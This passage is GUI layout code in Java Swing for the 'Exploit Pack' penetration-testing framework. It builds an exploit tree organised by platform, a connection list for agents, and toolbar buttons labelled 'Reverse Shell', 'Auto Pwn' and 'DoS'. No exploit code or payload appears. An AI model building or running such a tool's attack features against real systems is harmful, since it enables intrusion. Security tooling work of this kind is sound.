        jSeparator15 = new javax.swing.JPopupMenu.Separator();
        jMenuItem48 = new javax.swing.JMenuItem();
        jSeparator29 = new javax.swing.JPopupMenu.Separator();
        jMenuItem6 = new javax.swing.JMenuItem();
        jSeparator13 = new javax.swing.JPopupMenu.Separator();
        jMenuItem5 = new javax.swing.JMenuItem();
        jMenuItem4 = new javax.swing.JMenuItem();
        jSeparator14 = new javax.swing.JPopupMenu.Separator();
        jMenuItem1 = new javax.swing.JMenuItem();
        jMenu17 = new javax.swing.JMenu();
        jMenuItem63 = new javax.swing.JMenuItem();
        jMenuItem64 = new javax.swing.JMenuItem();
        jMenu2 = new javax.swing.JMenu();
        jMenuItem7 = new javax.swing.JMenuItem();
        jMenuItem8 = new javax.swing.JMenuItem();
        jMenuItem9 = new javax.swing.JMenuItem();
        jMenu3 = new javax.swing.JMenu();
        jMenuItem10 = new javax.swing.JMenuItem();
        jSeparator50 = new javax.swing.JPopupMenu.Separator();
        jMenuItem12 = new javax.swing.JMenuItem();
        jMenuItem62 = new javax.swing.JMenuItem();
        jMenu4 = new javax.swing.JMenu();
        jMenuItem11 = new javax.swing.JMenuItem();
        jSeparator17 = new javax.swing.JPopupMenu.Separator();
        jMenuItem13 = new javax.swing.JMenuItem();
        jSeparator16 = new javax.swing.JPopupMenu.Separator();
        jMenuItem60 = new javax.swing.JMenuItem();
        jSeparator48 = new javax.swing.JPopupMenu.Separator();
        jMenuItem59 = new javax.swing.JMenuItem();
        jMenuItem58 = new javax.swing.JMenuItem();
        jMenuItem61 = new javax.swing.JMenuItem();
        jSeparator49 = new javax.swing.JPopupMenu.Separator();
        jMenuItem14 = new javax.swing.JMenuItem();
        jMenu5 = new javax.swing.JMenu();
        jMenuItem15 = new javax.swing.JMenuItem();
        jMenuItem16 = new javax.swing.JMenuItem();
        jSeparator18 = new javax.swing.JPopupMenu.Separator();
        jMenuItem17 = new javax.swing.JMenuItem();
        jSeparator28 = new javax.swing.JPopupMenu.Separator();
        jMenuItem44 = new javax.swing.JMenuItem();
        jMenu6 = new javax.swing.JMenu();
        jMenuItem18 = new javax.swing.JMenuItem();
        jMenu8 = new javax.swing.JMenu();
        jMenu9 = new javax.swing.JMenu();
        jMenu10 = new javax.swing.JMenu();
        jMenuItem25 = new javax.swing.JMenuItem();
        jMenuItem26 = new javax.swing.JMenuItem();
        jMenuItem27 = new javax.swing.JMenuItem();
        jMenuItem28 = new javax.swing.JMenuItem();
        jMenuItem29 = new javax.swing.JMenuItem();
        jMenu12 = new javax.swing.JMenu();
        jMenuItem30 = new javax.swing.JMenuItem();
        jMenuItem31 = new javax.swing.JMenuItem();
        jMenuItem32 = new javax.swing.JMenuItem();
        jMenu13 = new javax.swing.JMenu();
        jMenuItem33 = new javax.swing.JMenuItem();
        jMenuItem34 = new javax.swing.JMenuItem();
        jMenu14 = new javax.swing.JMenu();
        jMenuItem35 = new javax.swing.JMenuItem();
        jMenuItem36 = new javax.swing.JMenuItem();
        jMenuItem37 = new javax.swing.JMenuItem();
        jMenuItem38 = new javax.swing.JMenuItem();
        jSeparator26 = new javax.swing.JPopupMenu.Separator();
        jMenu15 = new javax.swing.JMenu();
        jMenuItem39 = new javax.swing.JMenuItem();
        jMenuItem40 = new javax.swing.JMenuItem();
        jMenuItem41 = new javax.swing.JMenuItem();
        jMenuItem42 = new javax.swing.JMenuItem();
        jMenu18 = new javax.swing.JMenu();
        jMenuItem65 = new javax.swing.JMenuItem();
        jMenuItem66 = new javax.swing.JMenuItem();
        jMenu11 = new javax.swing.JMenu();
        jMenuItem50 = new javax.swing.JMenuItem();
        jSeparator31 = new javax.swing.JPopupMenu.Separator();
        jMenuItem51 = new javax.swing.JMenuItem();
        jSeparator32 = new javax.swing.JPopupMenu.Separator();
        jMenuItem52 = new javax.swing.JMenuItem();
        jSeparator33 = new javax.swing.JPopupMenu.Separator();
        jMenuItem53 = new javax.swing.JMenuItem();
        jSeparator34 = new javax.swing.JPopupMenu.Separator();
        jMenuItem54 = new javax.swing.JMenuItem();
        jMenu16 = new javax.swing.JMenu();
        jMenuItem55 = new javax.swing.JMenuItem();
        jSeparator35 = new javax.swing.JPopupMenu.Separator();
        jMenuItem56 = new javax.swing.JMenuItem();
        jMenu7 = new javax.swing.JMenu();
        jMenuItem19 = new javax.swing.JMenuItem();
        jSeparator36 = new javax.swing.JPopupMenu.Separator();
        jMenuItem57 = new javax.swing.JMenuItem();
        jMenuItem20 = new javax.swing.JMenuItem();
        jSeparator19 = new javax.swing.JPopupMenu.Separator();
        jMenuItem21 = new javax.swing.JMenuItem();
        jMenuItem22 = new javax.swing.JMenuItem();
        jSeparator21 = new javax.swing.JPopupMenu.Separator();
        jMenuItem23 = new javax.swing.JMenuItem();
        jSeparator20 = new javax.swing.JPopupMenu.Separator();
        jMenuItem43 = new javax.swing.JMenuItem();
        jSeparator27 = new javax.swing.JPopupMenu.Separator();
        jMenuItem24 = new javax.swing.JMenuItem();

        jMenuItem49.setText("jMenuItem49");

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setTitle("Exploit Pack - [ Triforce ] v7.5 - http://exploitpack.com");
        setIconImage(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/exploitpack/resources/bug.png")));
        addWindowListener(new java.awt.event.WindowAdapter() {
            public void windowClosed(java.awt.event.WindowEvent evt) {
                formWindowClosed(evt);
            }
        });

        jPanel1.setBackground(java.awt.Color.white);
        jPanel1.setMaximumSize(new java.awt.Dimension(239, 199));

        javax.swing.tree.DefaultMutableTreeNode treeNode1 = new javax.swing.tree.DefaultMutableTreeNode("JTree");
        javax.swing.tree.DefaultMutableTreeNode treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("Localhost (computer)");
        treeNode1.add(treeNode2);
        jTreeRAT.setModel(new javax.swing.tree.DefaultTreeModel(treeNode1));
        jTreeRAT.setPreferredSize(new java.awt.Dimension(87, 76));
        jTreeRAT.setRootVisible(false);
        jTreeRAT.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jTreeRATMouseClicked(evt);
            }
        });
        jTreeRAT.addTreeSelectionListener(new javax.swing.event.TreeSelectionListener() {
            public void valueChanged(javax.swing.event.TreeSelectionEvent evt) {
                jTreeRATValueChanged(evt);
            }
        });
        jScrollPane9.setViewportView(jTreeRAT);

        jLabel11.setFont(new java.awt.Font("Lucida Grande", 1, 13)); // NOI18N
        jLabel11.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/computer.png"))); // NOI18N
        jLabel11.setText("Connection list - Agents");

        jPanel2.setBackground(java.awt.Color.white);
        jPanel2.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(0, 0, 0)));

        jLabel15.setFont(new java.awt.Font("Lucida Grande", 1, 13)); // NOI18N
        jLabel15.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/1421275146_10_Search_16x16.png"))); // NOI18N
        jLabel15.setText("Modules search");

        jTextFieldSearch.setText("Name, author, platform, etc.");
        jTextFieldSearch.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jTextFieldSearchMouseClicked(evt);
            }
        });
        jTextFieldSearch.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jTextFieldSearchActionPerformed(evt);
            }
        });
        jTextFieldSearch.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyPressed(java.awt.event.KeyEvent evt) {
                jTextFieldSearchKeyPressed(evt);
            }
        });

        jButtonSearch.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/arrow-right-16.png"))); // NOI18N
        jButtonSearch.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButtonSearchActionPerformed(evt);
            }
        });

        jLabel22.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/filter-edit-16x16.gif"))); // NOI18N
        jLabel22.setText("Filter");

        jComboBox1.setModel(new javax.swing.DefaultComboBoxModel(new String[] { "Show all modules", "Show recent", "Count modules" }));
        jComboBox1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jComboBox1ActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout jPanel2Layout = new javax.swing.GroupLayout(jPanel2);
        jPanel2.setLayout(jPanel2Layout);
        jPanel2Layout.setHorizontalGroup(
            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel2Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(jPanel2Layout.createSequentialGroup()
                        .addComponent(jTextFieldSearch)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jButtonSearch))
                    .addGroup(jPanel2Layout.createSequentialGroup()
                        .addComponent(jLabel15)
                        .addGap(0, 0, Short.MAX_VALUE))
                    .addGroup(jPanel2Layout.createSequentialGroup()
                        .addComponent(jComboBox1, 0, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jLabel22)))
                .addContainerGap())
        );
        jPanel2Layout.setVerticalGroup(
            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel2Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jLabel15)
                .addGap(7, 7, 7)
                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jComboBox1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jLabel22))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jButtonSearch)
                    .addComponent(jTextFieldSearch, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        jPanel15.setBackground(java.awt.Color.white);

        jTabbedPane2.setBackground(java.awt.Color.white);
        jTabbedPane2.setMaximumSize(new java.awt.Dimension(100, 90));

        treeNode1 = new javax.swing.tree.DefaultMutableTreeNode("JTree");
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("Search");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("aix");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("android");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("arm");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("asp");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("atheos");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("beos");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("bsd");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("bsd_ppc");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("bsd_x86");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("bsdi_x86");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("cfm");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("cgi");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("freebsd");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("freebsd_x86");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("freebsd_x86-64");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("generator");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("hardware");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("hp-ux");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("immunix");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("ios");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("irix");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("java");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("jsp");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("lin_amd64");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("lin_x86");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("lin_x86-64");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("linux");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("linux_mips");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("linux_ppc");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("linux_sparc");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("minix");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("mips");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("multiple");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("netbsd_x86");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("netware");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("novell");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("openbsd");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("openbsd_x86");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("osx");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("osx_ppc");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("palm_os");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("php");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("plan9");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("qnx");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("sco");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("sco_x86");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("sh4");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("solaris");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("solaris_sparc");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("solaris_x86");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("tru64");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("ultrix");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("unix");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("unixware");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("webapps");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("win32");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("win64");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("windows");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("xml");
        treeNode1.add(treeNode2);
        jTreeExploits.setModel(new javax.swing.tree.DefaultTreeModel(treeNode1));
        jTreeExploits.setRootVisible(false);
        jTreeExploits.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jTreeExploitsMouseClicked(evt);
            }
        });
        jTreeExploits.addTreeSelectionListener(new javax.swing.event.TreeSelectionListener() {
            public void valueChanged(javax.swing.event.TreeSelectionEvent evt) {
                jTreeExploitsValueChanged(evt);
            }
        });
        jScrollPane1.setViewportView(jTreeExploits);

        jTabbedPane2.addTab("Exploits", jScrollPane1);

        treeNode1 = new javax.swing.tree.DefaultMutableTreeNode("JTree");
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("Scanner");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("DoS");
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("Remote Control");
        treeNode1.add(treeNode2);
        jTreeTools.setModel(new javax.swing.tree.DefaultTreeModel(treeNode1));
        jTreeTools.setRootVisible(false);
        jTreeTools.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jTreeToolsMouseClicked(evt);
            }
        });
        jTreeTools.addTreeSelectionListener(new javax.swing.event.TreeSelectionListener() {
            public void valueChanged(javax.swing.event.TreeSelectionEvent evt) {
                jTreeToolsValueChanged(evt);
            }
        });
        jScrollPane8.setViewportView(jTreeTools);

        jTabbedPane2.addTab("Auxiliary", jScrollPane8);

        treeNode1 = new javax.swing.tree.DefaultMutableTreeNode("Root");
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("Machines");
        treeNode1.add(treeNode2);
        jTreeNotepad.setModel(new javax.swing.tree.DefaultTreeModel(treeNode1));
        jTreeNotepad.setRootVisible(false);
        jTreeNotepad.addTreeSelectionListener(new javax.swing.event.TreeSelectionListener() {
            public void valueChanged(javax.swing.event.TreeSelectionEvent evt) {
                jTreeNotepadValueChanged(evt);
            }
        });
        jScrollPane18.setViewportView(jTreeNotepad);

        jTabbedPane2.addTab("Targets", jScrollPane18);

        javax.swing.GroupLayout jPanel15Layout = new javax.swing.GroupLayout(jPanel15);
        jPanel15.setLayout(jPanel15Layout);
        jPanel15Layout.setHorizontalGroup(
            jPanel15Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel15Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jTabbedPane2, javax.swing.GroupLayout.PREFERRED_SIZE, 269, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );
        jPanel15Layout.setVerticalGroup(
            jPanel15Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jTabbedPane2, javax.swing.GroupLayout.PREFERRED_SIZE, 0, Short.MAX_VALUE)
        );

        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);
        jPanel1.setLayout(jPanel1Layout);
        jPanel1Layout.setHorizontalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jPanel15, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
            .addGroup(jPanel1Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(jPanel1Layout.createSequentialGroup()
                        .addComponent(jLabel11)
                        .addGap(0, 0, Short.MAX_VALUE))
                    .addGroup(jPanel1Layout.createSequentialGroup()
                        .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(jScrollPane9)
                            .addComponent(jPanel2, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                        .addContainerGap())))
        );
        jPanel1Layout.setVerticalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel1Layout.createSequentialGroup()
                .addComponent(jPanel15, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jPanel2, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jLabel11)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jScrollPane9, javax.swing.GroupLayout.PREFERRED_SIZE, 112, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap())
        );

        jToolBar1.setFloatable(false);
        jToolBar1.setRollover(true);
        jToolBar1.add(jSeparator47);

        jButton4.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/new.png"))); // NOI18N
        jButton4.setText("New project");
        jButton4.setFocusable(false);
        jButton4.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        jButton4.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton4ActionPerformed(evt);
            }
        });
        jToolBar1.add(jButton4);
        jToolBar1.add(jSeparator1);

        jButton3.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/open.png"))); // NOI18N
        jButton3.setText("Open");
        jButton3.setFocusable(false);
        jButton3.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        jButton3.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton3ActionPerformed(evt);
            }
        });
        jToolBar1.add(jButton3);
        jToolBar1.add(jSeparator3);

        jButton6.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/1316134425_cut_red.png"))); // NOI18N
        jButton6.setText("Cut");
        jButton6.setFocusable(false);
        jButton6.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        jToolBar1.add(jButton6);
        jToolBar1.add(jSeparator5);

        jButton7.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/1316134439_page_copy.png"))); // NOI18N
        jButton7.setText("Copy");
        jButton7.setFocusable(false);
        jButton7.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        jToolBar1.add(jButton7);
        jToolBar1.add(jSeparator6);

        jButton8.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/1316134460_page_white_paste.png"))); // NOI18N
        jButton8.setText("Paste");
        jButton8.setToolTipText("");
        jButton8.setFocusable(false);
        jButton8.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        jToolBar1.add(jButton8);
        jToolBar1.add(jSeparator7);

        jButton9.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/interface.png"))); // NOI18N
        jButton9.setText("External IP:");
        jButton9.setFocusable(false);
        jButton9.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        jToolBar1.add(jButton9);

        jLabelInterface.setText("Interface");
        jToolBar1.add(jLabelInterface);
        jToolBar1.add(jSeparator8);

        jButton10.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/1316134599_chart_bar.png"))); // NOI18N
        jButton10.setText("View raw log");
        jButton10.setFocusable(false);
        jButton10.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        jButton10.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton10ActionPerformed(evt);
            }
        });
        jToolBar1.add(jButton10);
        jToolBar1.add(jSeparator4);

        jButton12.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/checkupdate.png"))); // NOI18N
        jButton12.setText("Update manager");
        jButton12.setFocusable(false);
        jButton12.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        jButton12.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton12ActionPerformed(evt);
            }
        });
        jToolBar1.add(jButton12);
        jToolBar1.add(jSeparator2);

        jButton21.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/1418844177_notepad_(edit)_16x16.gif"))); // NOI18N
        jButton21.setText("Notepad");
        jButton21.setToolTipText("");
        jButton21.setFocusable(false);
        jButton21.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        jButton21.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton21ActionPerformed(evt);
            }
        });
        jToolBar1.add(jButton21);
        jToolBar1.add(jSeparator12);

        jButton13.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/bugbug.png"))); // NOI18N
        jButton13.setText("Reverse Shell");
        jButton13.setFocusable(false);
        jButton13.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        jButton13.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton13ActionPerformed(evt);
            }
        });
        jToolBar1.add(jButton13);
        jToolBar1.add(jSeparator10);

        jButton14.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/robotauto.png"))); // NOI18N
        jButton14.setText("Auto Pwn");
        jButton14.setFocusable(false);
        jButton14.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        jButton14.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton14ActionPerformed(evt);
            }
        });
        jToolBar1.add(jButton14);
        jToolBar1.add(jSeparator30);

        jButton25.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/computer-network.png"))); // NOI18N
        jButton25.setText("Remote Control");
        jButton25.setFocusable(false);
        jButton25.setHorizontalAlignment(javax.swing.SwingConstants.TRAILING);
        jButton25.setHorizontalTextPosition(javax.swing.SwingConstants.RIGHT);
        jButton25.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        jButton25.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton25ActionPerformed(evt);
            }
        });
        jToolBar1.add(jButton25);
        jToolBar1.add(jSeparator42);

        jButton26.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/agent.png"))); // NOI18N
        jButton26.setText("Exploit Wizard");
        jButton26.setFocusable(false);
        jButton26.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        jButton26.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton26ActionPerformed(evt);
            }
        });
        jToolBar1.add(jButton26);
        jToolBar1.add(jSeparator11);

        jButton5.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/help.png"))); // NOI18N
        jButton5.setText("Documentation");
        jButton5.setFocusable(false);
        jButton5.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        jButton5.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton5ActionPerformed(evt);
            }
        });
        jToolBar1.add(jButton5);

        jTabbedPane.setBackground(java.awt.Color.white);
        jTabbedPane.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));

        jPanelDashboard.setBackground(java.awt.Color.white);

        jPanel3.setBackground(java.awt.Color.white);
        jPanel3.setBorder(javax.swing.BorderFactory.createTitledBorder(new javax.swing.border.LineBorder(new java.awt.Color(0, 0, 0), 1, true), "Target Properties", javax.swing.border.TitledBorder.DEFAULT_JUSTIFICATION, javax.swing.border.TitledBorder.TOP));

        jLabel1.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/project.png"))); // NOI18N
        jLabel1.setText("Project:");

        jLabel2.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/target.png"))); // NOI18N
        jLabel2.setText("Target:");

        jLabel3.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/port.png"))); // NOI18N
        jLabel3.setText("Port:");

        jLabel4.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/path.png"))); // NOI18N
        jLabel4.setText("Path:");

        jTextFieldProjectN.setText("Exploit Pack");

        jTextFieldTargetH.setText("127.0.0.1");
        jTextFieldTargetH.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jTextFieldTargetHMouseClicked(evt);
            }
        });

